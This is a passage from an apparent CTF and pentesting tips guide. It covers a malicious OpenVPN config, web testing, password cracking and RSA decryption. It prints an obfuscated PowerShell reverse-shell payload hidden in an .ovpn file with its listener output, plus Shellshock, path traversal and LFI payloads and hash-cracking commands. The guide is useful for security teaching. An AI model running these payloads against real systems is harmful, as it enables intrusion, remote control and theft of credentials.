setenv l1 ‘GkAZQBuAHQALgBDAG8AbgBuAGUAYwB0AGUAZAAgAC0AbgBlACAAJAB0AHIAdQBlACkAIAB7AGMAbABlAGEAbgB1AHAAfQANAAoAJABwAG8AcwAgAD0AIAAwADsAIAAkAGkAIAA9ACAAMQANAAoAdwBoAGkAbABlACAAKAAoACQAaQAgAC0AZwB0ACAAMAApACAALQBhAG4AZAAgACgAJABwAG8AcwAgAC0AbAB0ACAAJABu’
setenv m1 ‘AGUAdAB3AG8AcgBrAGIAdQBmAGYAZQByAC4ATABlAG4AZwB0AGgAKQApACAAewANAAoAJAByAGUAYQBkACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABuAGUAdAB3AG8AcgBrAGIAdQBmAGYAZQByACwAJABwAG8AcwAsACQAbgBlAHQAdwBvAHIAawBiAHUAZgBmAGUAcgAuAEwAZQBuAGcAdABoACAALQA’
setenv n1 ‘gACQAcABvAHMAKQANAAoAJABwAG8AcwArAD0AJAByAGUAYQBkADsAIABpAGYAIAAoACQAcABvAHMAIAAtAGEAbgBkACAAKAAkAG4AZQB0AHcAbwByAGsAYgB1AGYAZgBlAHIAWwAwAC4ALgAkACgAJABwAG8AcwAtADEAKQBdACAALQBjAG8AbgB0AGEAaQBuAHMAIAAxADAAKQApACAAewBiAHIAZQBhAGsAfQB9AA0ACg’
setenv o1 ‘BpAGYAIAAoACQAcABvAHMAIAAtAGcAdAAgADAAKQAgAHsADQAKACQAcwB0AHIAaQBuAGcAIAA9ACAAJABlAG4AYwBvAGQAaQBuAGcALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAbgBlAHQAdwBvAHIAawBiAHUAZgBmAGUAcgAsADAALAAkAHAAbwBzACkADQAKACQAaQBuAHAAdQB0AHMAdAByAGUAYQBtAC4AdwByAGkAd’
setenv p1 ‘ABlACgAJABzAHQAcgBpAG4AZwApAA0ACgBzAHQAYQByAHQALQBzAGwAZQBlAHAAIAAxAA0ACgBpAGYAIAAoACQAcAByAG8AYwBlAHMAcwAuAEUAeABpAHQAQwBvAGQAZQAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7AGMAbABlAGEAbgB1AHAAfQANAAoAZQBsAHMAZQAgAHsADQAKACQAbwB1AHQAIAA9ACAAJABlAG4A’
setenv q1 ‘YwBvAGQAaQBuAGcALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAbwB1AHQAcAB1AHQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAKQApAA0ACgB3AGgAaQBsAGUAKAAkAG8AdQB0AHAAdQB0AHMAdAByAGUAYQBtAC4AUABlAGUAawAoACkAIAAtAG4AZQAgAC0AMQApAHsADQAKACQAbwB1AHQAIAArAD0AIAAkAGUAbgBjAG8’
setenv r1 ‘AZABpAG4AZwAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABvAHUAdABwAHUAdABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAApACkAOwAgAGkAZgAgACgAJABvAHUAdAAgAC0AZQBxACAAJABzAHQAcgBpAG4AZwApACAAewAkAG8AdQB0ACAAPQAgACcAJwB9AH0ADQAKACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAG’
setenv s1 ‘UAbgBjAG8AZABpAG4AZwAuAEcAZQB0AEIAeQB0AGUAcwAoACQAbwB1AHQAKQAsADAALAAkAG8AdQB0AC4AbABlAG4AZwB0AGgAKQANAAoAJABvAHUAdAAgAD0AIAAkAG4AdQBsAGwADQAKACQAcwB0AHIAaQBuAGcAIAA9ACAAJABuAHUAbABsAH0AfQAgAGUAbABzAGUAIAB7AGMAbABlAGEAbgB1AHAAfQB9AA==’
up &#39;C:\\Windows\\System32\\cmd.exe /c (start %z1% -WindowStyle Hidden -EncodedCommand %a1%%b1%%c1%%d1%%e1%%f1%%g1%%h1%%i1%%j1%%k1%%l1%%m1%%n1%%o1%%p1%%q1%%r1%%s1% ) ||&#39;
</pre></div>
</div>
<p>We can see the encoded script has been split over a setenv commands. At the very end, the script just runs all the environment variables together.</p>
<p>Result</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>albinolobster@ubuntu:~$ nc -lvp 8181
Listening on [0.0.0.0] (family 0, port 8181)
Connection from [192.168.1.226] port 8181 [tcp/*] accepted (family 2, sport 51082)
Microsoft Windows [Version 10.0.17134.48]
© 2018 Microsoft Corporation. All rights reserved.
C:\Users\albinolobster\OpenVPN\config\albino_lobster&gt;whoami
desktop-r5u6pvd\albinolobster
C:\Users\albinolobster\OpenVPN\config\albino_lobster&gt;
</pre></div>
</div>
<p>Using untrusted ovpn files is dangerous. You are allowing a stranger to execute arbitrary commands on your computer. Some OpenVPN compatible clients like Viscosity and Ubuntu’s Network Manager GUI disable this behavior.</p>
</section>
</section>
<section id="http">
<h3>HTTP<a class="headerlink" href="#http" title="Link to this heading"></a></h3>
<section id="first-things">
<h4>First things<a class="headerlink" href="#first-things" title="Link to this heading"></a></h4>
<ul class="simple">
<li><p>View Source of the web-page (Ctrl+U).</p></li>
<li><p>Inspect element of the web-page (F12).</p></li>
<li><p>See if there is any hint in the title of the web page. (example: /Magic).</p></li>
<li><p>Check the scroll button! Sometimes, there are too many lines and something hidden in the end of the webpage!</p></li>
<li><p>Check for any long file names such admin_5f4dcc3b5aa765d61d8327deb882cf99.txt; Such long names can be base64-encoded, hex, md5 etc.</p></li>
<li><p>If any login page is implemented asking for username and password. Check how it is implemented? Is it using any open-source authentication modules? If so, look if there are any default passwords for that.</p></li>
<li><p>If there’s a page where redirect is happening (for example, <a class="reference external" href="http://example.com">http://example.com</a> or <a class="reference external" href="http://example.com/support.php">http://example.com/support.php</a> redirects us to <a class="reference external" href="http://example.com/login.php">http://example.com/login.php</a>) However, the response size for example.com or support.php is a bit off, especially considering the page gives a 302 redirect. We may use No-redirect extension from firefox and view the page. We may also utilize curl/ burp to view the response.</p></li>
<li><p><a class="reference external" href="https://en.wikipedia.org/wiki/List_of_HTTP_header_fields">List of HTTP Headers</a> : Quite important when you want to set headers/ cookies etc.</p></li>
<li><p>Watch for places where the site redirects you (it adds something to the URL and displays the homepage). If you see that happen, try adjusting the URL manually. for example:
when browsing</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">IPAddress</span><span class="o">/</span><span class="n">SitePages</span><span class="o">/</span>
</pre></div>
</div>
<p>it redirects to</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">IPAddress</span><span class="o">/</span><span class="n">_layouts</span><span class="o">/</span><span class="mi">15</span><span class="o">/</span><span class="n">start</span><span class="o">.</span><span class="n">aspx</span><span class="c1">#/SitePages/Forms/AllPages.aspx</span>
</pre></div>
</div>
<p>we may find something by adjusting the URL manually to</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">IPAddress</span><span class="o">/</span><span class="n">SitePages</span><span class="o">/</span><span class="n">Forms</span><span class="o">/</span><span class="n">AllPages</span><span class="o">.</span><span class="n">aspx</span>
</pre></div>
</div>
</div></blockquote>
</section>
<section id="csc-austria-ctf-tips-and-tricks">
<h4>CSC Austria: CTF Tips and Tricks<a class="headerlink" href="#csc-austria-ctf-tips-and-tricks" title="Link to this heading"></a></h4>
<p>Refer <a class="reference external" href="https://security-hub.at/download/csc_austria_ctf_tips_and_tricks.pdf">SEC Consult – Cyber Security Challenge Austria /CTF Tips &amp; Tricks</a></p>
<ul>
<li><p>Read the source code / comments</p></li>
<li><p>Check for common hidden files / folders (.git, .ssh, robots.txt, backup, .DS_Store, .svn, changelog.txt, server-status, admin, administrator, …)</p></li>
<li><p>Check for common extensions (Example: If you see a index.php file, check index.php.tmp, index.php.bak, and so on)</p></li>
<li><p>Play with the URL / parameters / cookies (Example: If you have a page with index.php?role=user try to change it to index.php?role=admin).</p></li>
<li><p>Get familiar with the website, it’s functionalities and features before starting an in-depth analysis.</p></li>
<li><p>Try to map the full attack-surface of the website! Some vulnerabilities are hidden deep in hard-to-reach functionalities.</p></li>
<li><p>Test for the most common vulnerabilities like SQLi (SQL Injection), XXE (XML Entity Injection), Path Traversal, File Uploads, Command Injection, Cookie Tampering, XSS (Cross-Site-Scripting), XPATH Injection, Unserialization bugs, Outdated software, CSRF
(Cross-Site-Request-Forgery), SSRF (Server-Side-Request-Forgery), SSTI (Server-Side Template Injection), LFI/RFI (Local-File-Inclusion / Remote-File-Inclusion), Flaws in Session Management or Authorization Flaws, the randomness of the cookies, and so on.</p></li>
<li><p>If you come across a technology which you don’t know, try to google security writeups for these technologies.</p></li>
<li><p>Try special characters</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>(‘, “, {, ;, |, &amp;&amp;, \, /, !(), %…)
</pre></div>
</div>
</li>
</ul>
<blockquote>
<div><p>in all input fields (GET- and POST parameters and Cookies) and check for uncommon responses or error messages.</p>
</div></blockquote>
<ul>
<li><p>To detect blind vulnerabilities (SQL injection, command injection, XSS, …) you can use time delays or requests to one of your web servers (check the access logs).</p></li>
<li><p>If you can provide a path or a filename to the website, you should test for path traversal vulnerabilities. If the application replaces the</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>“../”
</pre></div>
</div>
</li>
</ul>
<blockquote>
<div><p>with an empty string, you can try to bypass it by injecting the sequence two times, like:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>“…/./”.
</pre></div>
</div>
<p>If the “../” in the center gets replaced, the application will again work with “../”. You can also try different encodings or other removed characters. Moreover, you can try to create or upload (e.g. via archives) a symbolic link.</p>
</div></blockquote>
<ul class="simple">
<li><p>If you found a LFI (local-file-inclusion) vulnerability in a PHP website and you want to read the PHP scripts, you can use php-filter (you can’t normally read .php files because the inclusion would try to execute the code instead of displaying it;
with php-filter you can first base64-encode the content to display it):</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span>index.php?filename=php://filter/convert.base64-encode/resource=index.php
</pre></div>
</div>
</div></blockquote>
</section>
<section id="htaccess-useragent">
<h4>htaccess - UserAgent<a class="headerlink" href="#htaccess-useragent" title="Link to this heading"></a></h4>
<p>When you see something like this “Someone’s sup3r s3cr3t dr0pb0x - only me and Steve Jobs can see this content”. Which says, only this can see me. Try to see what user-agent it is talking about. The way it is implemented is by use of .htaccess file</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>cat .htaccess
BrowserMatchNoCase &quot;iPhone&quot; allowed

Order Deny,Allow
Deny from ALL
Allow from env=allowed
ErrorDocument 403 “&lt;H1&gt;Super secret location - only me and Steve Jobs can see this content&lt;/H1&gt;&lt;H2&gt;Lol&lt;/H2&gt;”
</pre></div>
</div>
</section>
<section id="cgi-bin-shellshock">
<h4>CGI-BIN Shellshock<a class="headerlink" href="#cgi-bin-shellshock" title="Link to this heading"></a></h4>
<p>To understand shellshock few blogs can be referred such as <a class="reference external" href="https://www.surevine.com/shellshocked-a-quick-demo-of-how-easy-it-is-to-exploit/">ShellShocked – A quick demo of how easy it is to exploit</a> , <a class="reference external" href="https://blog.cloudflare.com/inside-shellshock/">Inside Shellshock: How hackers are using it to exploit systems</a></p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">curl</span> <span class="o">-</span><span class="n">H</span> <span class="s2">&quot;User-Agent: () { :; }; echo &#39;Content-type: text/html&#39;; echo; /bin/cat /etc/passwd&quot;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.56.2</span><span class="p">:</span><span class="mi">591</span><span class="o">/</span><span class="n">cgi</span><span class="o">-</span><span class="nb">bin</span><span class="o">/</span><span class="n">cat</span>
</pre></div>
</div>
<p>It is important to understand what is cgi-bin which can be read from <a class="reference external" href="http://www.team2053.org/docs/bashcgi/gettingstarted.html">Creating CGI Programs with Bash: Getting Started</a> . Also the most important lines in this file are:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">echo</span> <span class="s2">&quot;Content-type: text/html&quot;</span>
<span class="n">echo</span> <span class="s2">&quot;&quot;</span>
</pre></div>
</div>
<p>These two lines tell your browser that the rest of the content coming from the program is HTML, and should be treated as such. Leaving these lines out will often cause your browser to download the output of the program to disk as a text file instead of displaying it, since it doesn’t understand that it is HTML!</p>
<p><strong>Shellshock Local Privilege Escalation</strong></p>
<p>Binaries with a setuid bit and calling (directly or indirectly) bash through execve, popen or system are tools which may be used to activate the Shell Shock bug.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sudo</span> <span class="n">PS1</span><span class="o">=</span><span class="s2">&quot;() { :;} ;  /bin/sh&quot;</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">username</span><span class="o">/</span><span class="n">suidbinary</span>
</pre></div>
</div>
<p>Shellshock also affects DHCP as mentioned <a class="reference external" href="https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/">Shellshock DHCP RCE Proof of Concept</a> There’s a metasploit module named “Dhclient Bash Environment Variable Injection (Shellshock)” for this.</p>
</section>
<section id="xss-html-injection">
<h4>XSS/ HTML Injection<a class="headerlink" href="#xss-html-injection" title="Link to this heading"></a></h4>
<p>The below will redirect the page to google.com</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;META http-equiv=“refresh” content=“0;URL=http://www.google.com”&gt;
</pre></div>
</div>
</section>
<section id="curl">
<h4>curl<a class="headerlink" href="#curl" title="Link to this heading"></a></h4>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>-k, --insecure
(SSL) This option explicitly allows curl to perform &quot;insecure&quot; SSL connections and transfers. All SSL connections are attempted to be made secure by using the CA certificate  bundle  installed  by  default.
This makes all connections considered &quot;insecure&quot; fail unless -k, --insecure is used.

-I, --head
(HTTP/FTP/FILE) Fetch the HTTP-header only! HTTP-servers feature the command HEAD which this uses to get nothing but the header of a document. When used on an FTP or FILE file, curl displays the  file  size and last modification time only.
</pre></div>
</div>
</section>
<section id="http-referer">
<h4>HTTP Referer<a class="headerlink" href="#http-referer" title="Link to this heading"></a></h4>
<p>The Referer request header contains the address of the previous web page from which a link to the currently requested page was followed. The Referer header allows servers to identify where people are visiting them from and may use that data for analytics, logging, or optimized caching.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Referer</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">url</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">url</span><span class="o">&gt;</span> <span class="n">An</span> <span class="n">absolute</span> <span class="ow">or</span> <span class="n">partial</span> <span class="n">address</span> <span class="n">of</span> <span class="n">the</span> <span class="n">previous</span> <span class="n">web</span> <span class="n">page</span> <span class="kn">from</span> <span class="nn">which</span> <span class="n">a</span> <span class="n">link</span> <span class="n">to</span> <span class="n">the</span> <span class="n">currently</span> <span class="n">requested</span> <span class="n">page</span> <span class="n">was</span> <span class="n">followed</span><span class="o">.</span> <span class="n">URL</span> <span class="n">fragments</span> <span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">e</span><span class="o">.</span> <span class="s2">&quot;#section&quot;</span><span class="p">)</span> <span class="n">are</span> <span class="ow">not</span> <span class="n">included</span><span class="o">.</span>
</pre></div>
</div>
</section>
<section id="data-uri">
<h4>Data-URI<a class="headerlink" href="#data-uri" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs">Basics of HTTP Data URI</a></p>
</section>
<section id="login-pages">
<h4>Login-Pages<a class="headerlink" href="#login-pages" title="Link to this heading"></a></h4>
<p>To test login pages, we may use burpsuite intruder and check for different length of response.</p>
</section>
<section id="delete-tags">
<h4>Delete Tags<a class="headerlink" href="#delete-tags" title="Link to this heading"></a></h4>
<p>Delete all lines between tags including tags:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sed</span> <span class="s1">&#39;/&lt;tag&gt;/,/&lt;\/tag&gt;/d&#39;</span> <span class="nb">input</span><span class="o">.</span><span class="n">txt</span>
</pre></div>
</div>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>Useful when you are accessing the webpage using curl and their LFI and you want to remove the html/ body tags.</p>
</div>
</section>
<section id="http-404-custom-page">
<h4>HTTP 404 Custom Page<a class="headerlink" href="#http-404-custom-page" title="Link to this heading"></a></h4>
<p>Sometimes, it’s a good idea to look at 404 custom page also. There might be some information stored.</p>
</section>
</section>
<section id="password-protected-file">
<h3>Password Protected File<a class="headerlink" href="#password-protected-file" title="Link to this heading"></a></h3>
<section id="zip-file">
<h4>ZIP File<a class="headerlink" href="#zip-file" title="Link to this heading"></a></h4>
<p>run fcrackzip</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">fcrackzip</span> <span class="o">-</span><span class="n">D</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">p</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">rockyou2</span><span class="o">.</span><span class="n">txt</span> <span class="n">flag</span><span class="o">.</span><span class="n">zip</span>

<span class="o">-</span><span class="n">D</span><span class="p">,</span> <span class="o">--</span><span class="n">dictionary</span><span class="p">:</span>    <span class="n">Select</span> <span class="n">dictionary</span> <span class="n">mode</span><span class="o">.</span> <span class="n">In</span> <span class="n">this</span> <span class="n">mode</span><span class="p">,</span> <span class="n">fcrackzip</span> <span class="n">will</span> <span class="n">read</span> <span class="n">passwords</span> <span class="kn">from</span> <span class="nn">a</span> <span class="n">file</span><span class="p">,</span> <span class="n">which</span> <span class="n">must</span> <span class="n">contain</span> <span class="n">one</span> <span class="n">password</span> <span class="n">per</span> <span class="n">line</span> <span class="ow">and</span> <span class="n">should</span> <span class="n">be</span> <span class="n">alphabetically</span> <span class="nb">sorted</span> <span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">g</span><span class="o">.</span> <span class="n">using</span> <span class="n">sort</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="o">.</span>
<span class="o">-</span><span class="n">p</span><span class="p">,</span> <span class="o">--</span><span class="n">init</span><span class="o">-</span><span class="n">password</span> <span class="n">string</span> <span class="p">:</span>  <span class="n">Set</span> <span class="n">initial</span> <span class="p">(</span><span class="n">starting</span><span class="p">)</span> <span class="n">password</span> <span class="k">for</span> <span class="n">brute</span><span class="o">-</span><span class="n">force</span> <span class="n">searching</span> <span class="n">to</span> <span class="n">string</span><span class="p">,</span> <span class="ow">or</span> <span class="n">use</span> <span class="n">the</span> <span class="n">file</span> <span class="k">with</span> <span class="n">the</span> <span class="n">name</span> <span class="n">string</span> <span class="n">to</span> <span class="n">supply</span> <span class="n">passwords</span> <span class="k">for</span> <span class="n">dictionary</span> <span class="n">searching</span><span class="o">.</span>
<span class="o">-</span><span class="n">u</span><span class="p">,</span> <span class="o">--</span><span class="n">use</span><span class="o">-</span><span class="n">unzip</span><span class="p">:</span> <span class="n">Try</span> <span class="n">to</span> <span class="n">decompress</span> <span class="n">the</span> <span class="n">first</span> <span class="n">file</span> <span class="n">by</span> <span class="n">calling</span> <span class="n">unzip</span> <span class="k">with</span> <span class="n">the</span> <span class="n">guessed</span> <span class="n">password</span><span class="o">.</span> <span class="n">This</span> <span class="n">weeds</span> <span class="n">out</span> <span class="n">false</span> <span class="n">positives</span> <span class="n">when</span> <span class="ow">not</span> <span class="n">enough</span> <span class="n">files</span> <span class="n">have</span> <span class="n">been</span> <span class="n">given</span><span class="o">.</span>
</pre></div>
</div>
</section>
<section id="rar2john">
<h4>rar2john<a class="headerlink" href="#rar2john" title="Link to this heading"></a></h4>
<p>We can get the password hash of a password protected rar file by using rar2john</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>[root:~/Downloads]# rar2john crocs.rar
file name: artwork.jpg
crocs.rar:$RAR3$*1*35c0eaaed4c9efb9*463323be*140272*187245*0*crocs.rar*76*35:1::artwork.jpg
</pre></div>
</div>
</section>
<section id="keepass2john">
<h4>keepass2john<a class="headerlink" href="#keepass2john" title="Link to this heading"></a></h4>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>keepass2john user.kdbx
user:$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">john</span> <span class="o">--</span><span class="n">wordlist</span> <span class="n">wordlist</span> <span class="o">--</span><span class="nb">format</span><span class="o">=</span><span class="n">keepass</span> <span class="n">hashfile</span>
</pre></div>
</div>
<p>There are other *2john thingy</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">dmg2john</span>
<span class="n">gpg2john</span>
<span class="n">hccap2john</span>
<span class="n">keepass2john</span>
<span class="n">keychain2john</span>
<span class="n">keyring2john</span>
<span class="n">keystore2john</span>
<span class="n">kwallet2john</span>
<span class="n">luks2john</span>
<span class="n">pfx2john</span>
<span class="n">putty2john</span>
<span class="n">pwsafe2john</span>
<span class="n">racf2john</span>
<span class="n">rar2john</span>
<span class="n">ssh2john</span>
<span class="n">truecrypt_volume2john</span>
<span class="n">uaf2john</span>
<span class="n">wpapcap2john</span>
<span class="n">zip2john</span>
</pre></div>
</div>
</section>
</section>
<section id="encrypted-files">
<h3>Encrypted Files<a class="headerlink" href="#encrypted-files" title="Link to this heading"></a></h3>
<p>Many times during the challenges, we do find encrypted files encrypted by Symmetric key encryption or RSA Public-Private Key encryption</p>
<section id="symmetric-key">
<h4>Symmetric Key<a class="headerlink" href="#symmetric-key" title="Link to this heading"></a></h4>
<p>If we have the encrypted file and the key to it. However, we don’t know the encryption scheme such as aes-128-cbc, des-cbc.</p>
<p>We can use the code written by superkojiman in <a class="reference external" href="https://blog.techorganic.com/2011/07/19/de-ice-hacking-challenge-part-1/">De-ICE Hacking Challenge Part-1</a> , it would tell you what encryption scheme is used and then we can run the command to retrieve the plaintext.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>ciphers=`openssl list-cipher-commands`
for i in $ciphers; do
 openssl enc -d -${i} -in &lt;encrypted-file&gt; -k &lt;password/ keyfile&gt; &gt; /dev/null 2&gt;&amp;1
 if [[ $? -eq 0 ]]; then
  echo &quot;Cipher is $i: openssl enc -d -${i} -in &lt;encrypted-file&gt; -k &lt;password/ keyfile&gt; -out foo.txt&quot;
  exit
 fi
done
</pre></div>
</div>
</section>
<section id="rsa-public-private-key-encryption">
<h4>RSA Public-Private Key encryption<a class="headerlink" href="#rsa-public-private-key-encryption" title="Link to this heading"></a></h4>
<p>If we have found a weak RSA public, we can use <a class="reference external" href="https://github.com/Ganapati/RsaCtfTool">RsaCtfTool</a> uncipher data from weak public key and try to recover private key and then use</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">openssl</span> <span class="n">rsautl</span> <span class="o">-</span><span class="n">decrypt</span> <span class="o">-</span><span class="n">inkey</span> <span class="n">privatekey</span><span class="o">.</span><span class="n">pem</span> <span class="o">-</span><span class="ow">in</span> <span class="o">&lt;</span><span class="n">encryptedfile</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">out</span> <span class="n">key</span><span class="o">.</span><span class="n">bin</span>
</pre></div>
</div>
<p>The ciphertext should be in binary format for RsaCtfTool to work. If you have your ciphertext in hex, for example</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mf">5e14</span><span class="n">f2c53cbc04b82a35414dc670a8a474ee0021349f280bfef215e23d40601a</span>
</pre></div>
</div>
<p>Convert it in to binary using</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">xxd</span> <span class="o">-</span><span class="n">r</span> <span class="o">-</span><span class="n">p</span> <span class="n">ciphertext</span> <span class="o">&gt;</span> <span class="n">ciphertext3</span>
</pre></div>
</div>
</section>
<section id="rsa-given-q-p-and-e">
<h4>RSA given q, p and e?<a class="headerlink" href="#rsa-given-q-p-and-e" title="Link to this heading"></a></h4>
<p>Taken from <a class="reference external" href="https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e">RSA Given q,p and e</a></p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
   <span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">,</span> <span class="n">u</span><span class="p">,</span><span class="n">v</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span><span class="mi">0</span>
   <span class="k">while</span> <span class="n">a</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
       <span class="n">q</span><span class="p">,</span> <span class="n">r</span> <span class="o">=</span> <span class="n">b</span><span class="o">//</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="o">%</span><span class="n">a</span>
       <span class="n">m</span><span class="p">,</span> <span class="n">n</span> <span class="o">=</span> <span class="n">x</span><span class="o">-</span><span class="n">u</span><span class="o">*</span><span class="n">q</span><span class="p">,</span> <span class="n">y</span><span class="o">-</span><span class="n">v</span><span class="o">*</span><span class="n">q</span>
       <span class="n">b</span><span class="p">,</span><span class="n">a</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">,</span> <span class="n">u</span><span class="p">,</span><span class="n">v</span> <span class="o">=</span> <span class="n">a</span><span class="p">,</span><span class="n">r</span><span class="p">,</span> <span class="n">u</span><span class="p">,</span><span class="n">v</span><span class="p">,</span> <span class="n">m</span><span class="p">,</span><span class="n">n</span>
       <span class="n">gcd</span> <span class="o">=</span> <span class="n">b</span>
   <span class="k">return</span> <span class="n">gcd</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>

   <span class="n">p</span> <span class="o">=</span> <span class="mi">1090660992520643446103273789680343</span>
   <span class="n">q</span> <span class="o">=</span> <span class="mi">1162435056374824133712043309728653</span>
   <span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
   <span class="n">ct</span> <span class="o">=</span> <span class="mi">299604539773691895576847697095098784338054746292313044353582078965</span>

   <span class="c1"># compute n</span>
   <span class="n">n</span> <span class="o">=</span> <span class="n">p</span> <span class="o">*</span> <span class="n">q</span>

   <span class="c1"># Compute phi(n)</span>
   <span class="n">phi</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>

   <span class="c1"># Compute modular inverse of e</span>
   <span class="n">gcd</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">phi</span><span class="p">)</span>
   <span class="n">d</span> <span class="o">=</span> <span class="n">a</span>

   <span class="nb">print</span><span class="p">(</span> <span class="s2">&quot;n:  &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="p">);</span>

   <span class="c1"># Decrypt ciphertext</span>
   <span class="n">pt</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">ct</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
   <span class="nb">print</span><span class="p">(</span> <span class="s2">&quot;pt: &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">pt</span><span class="p">)</span> <span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
   <span class="n">main</span><span class="p">()</span>
</pre></div>
</div>
</section>
<section id="seccure-elliptic-curve-crypto-utility-for-reliable-encryption">
<h4>SECCURE Elliptic Curve Crypto Utility for Reliable Encryption<a class="headerlink" href="#seccure-elliptic-curve-crypto-utility-for-reliable-encryption" title="Link to this heading"></a></h4>
<p>If you see, something like this</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="s1">&#39;</span><span class="se">\x00\x14</span><span class="s1">6</span><span class="se">\x17\xe9\xc1\x1a\x7f</span><span class="s1">kX</span><span class="se">\xec\xa0</span><span class="s1">n,h</span><span class="se">\xb4\xd0\x98\xea</span><span class="s1">O[</span><span class="se">\xf8\xfa\x85\xaa\xb3</span><span class="s1">7!</span><span class="se">\xf0</span><span class="s1">j</span><span class="se">\x0e\xd4\xd0\x8b\xfe</span><span class="s1">}</span><span class="se">\x8a\xd2</span><span class="s1">+</span><span class="se">\xf2\xce</span><span class="s1">u</span><span class="se">\x07\x90</span><span class="s1">K2E</span><span class="se">\x12\x1d\xf1\xd8\x8f\xc6\x91\t</span><span class="s1">&lt;w</span><span class="se">\x99\x1b</span><span class="s1">9</span><span class="se">\x98</span><span class="s1">&#39;</span>
</pre></div>
</div>
<p>it’s probably <a class="reference external" href="http://point-at-infinity.org/seccure/">SECCURE Elliptic Curve Crypto Utility for Reliable Encryption</a> Utilize python module <a class="reference external" href="https://pypi.python.org/pypi/seccure">seccure</a> to get the plaintext.</p>
</section>
<section id="gpg">
